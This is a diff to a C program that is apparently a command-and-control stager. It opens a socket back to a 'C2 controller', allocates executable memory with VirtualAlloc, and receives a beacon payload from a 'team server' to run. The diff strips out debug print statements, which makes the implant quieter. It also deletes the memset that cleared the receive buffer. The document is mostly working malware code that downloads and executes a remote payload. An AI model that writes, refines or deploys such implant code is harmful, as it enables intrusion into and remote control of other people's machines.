@@ -169,10 +169,10 @@ void sendData(SOCKET sd, const char* data, DWORD len) {
  * @param max full size of allocated buffer
  * @return Size of data recieved
  * @pre buffer points to an allocated memory region of size max
- * @post buffer contains the data recieved from the team server and no other data
+ * @post buffer contains the data recieved from the team server
 */
 DWORD recvData(SOCKET sd, char * buffer, DWORD max) {
-	memset(buffer, 0, max);
+
 	char* random_line = malloc(512);
 	DWORD size = 0, total = 0;
 
@@ -244,7 +244,7 @@ void write_frame(HANDLE smb_handle, char * buffer, DWORD length) {
  */
 void main(int argc, char* argv[])
 {
-	printf("Running the file\n");
+
 	// Set connection and IRC info
 	if (argc != 4)
 	{
@@ -273,7 +273,7 @@ void main(int argc, char* argv[])
 
 	// Create a connection back to our C2 controller
 	SOCKET sockfd = INVALID_SOCKET;
-	printf("Creating socket\n");
+
 	sockfd = create_socket(IP, PORT);
 	if (sockfd == INVALID_SOCKET)
 	{
@@ -282,7 +282,7 @@ void main(int argc, char* argv[])
 	}
 
 	// Allocate data for receiving beacon payload
-	printf("running Virutal Alloc\n");
+
 	char * payload = VirtualAlloc(0, PAYLOAD_MAX_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	if (payload == NULL)
 	{
@@ -291,7 +291,7 @@ void main(int argc, char* argv[])
 	}
 
 	//Receive initial payload data
-	printf("Recieving initial payload data");
+
 	DWORD read_size = recvData(sockfd, payload, BUFFER_MAX_SIZE);
 	if (read_size < 0) 
 	{
